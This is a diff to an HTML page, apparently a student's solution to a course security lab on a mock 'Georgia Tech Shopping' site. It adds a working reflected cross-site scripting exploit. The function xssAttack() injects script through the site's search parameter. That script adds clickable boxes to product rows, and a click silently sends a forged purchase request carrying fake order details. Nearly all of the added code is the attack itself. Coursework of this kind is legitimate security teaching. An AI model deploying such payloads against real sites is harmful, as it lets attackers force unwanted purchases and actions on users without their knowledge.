@@ -4,9 +4,61 @@
     <meta charset="UTF-8" />
     <title>Clickjacking</title>
   </head>
+
+  <script type="text/javascript">
+   function xssAttack(){
+	var searchQuery = document.getElementById("q").value;
+	//add a bunch of js code to the end of this url
+	var script = `
+	document.addEventListener('DOMContentLoaded',(event) => {
+		var tds = document.querySelectorAll("tr");
+		tds.forEach(function(td,index){
+			if(index !== 0){
+				var newDiv = document.createElement("div");
+				newDiv.id = index;
+				newDiv.style.width="20px";
+				newDiv.style.height="20px";
+				newDiv.style.border="solid";
+				newDiv.style.color="red";
+				newDiv.style.position = "relative";
+				newDiv.style.display = "inline-block";
+				newDiv.style.right="20px";
+				newDiv.onclick = function(event) {
+					var Http = new XMLHttpRequest();
+					var href = document.getElementById(index).parentNode.firstChild.href;
+					var product_id = (href.split('='))[1];
+					var cols = document.getElementById(index).parentNode.parentNode.querySelectorAll('td');
+					var name = cols[1].innerHTML;
+					var price = cols[3].innerHTML;
+					console.log("&");
+					var params = 'mail=lol@lol.com&' + 'address=lol&' + 'ship_date=2011-01-01&' + 'phone=1234567&' + 'price=$' + price + '&product_id=' + product_id +   '&product_name=' + name;
+					var url = 'http://www.gtshop.com/products/buy';
+					Http.open('POST',url);
+					Http.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+					Http.send(params);
+					var dis = document.getElementById(index);
+					dis.style.pointerEvents = 'none';
+				};
+				td.lastElementChild.appendChild(newDiv);
+			}
+		});
+		
+	})
+
+	`
+	var url = "http://www.gtshop.com/products/lookup?q=" + searchQuery + '<script>' + encodeURIComponent(script) + '<\/script>'
+	window.location.href = url
+	return false
+
+    }
+
+  </script>
+
+
   <body>
     <!-- DO NOT change the form id -->
-    <form id="clickjack-form">
+
+    <form id="clickjack-form" onsubmit="return xssAttack()" >
     <!-- !!! DO NOT MODIFY ANYTHING BELOW THIS COMMENT !!! -->
       <h1>Georgia Tech Shopping</h1>
       <input type="text" name="q" id="q" />
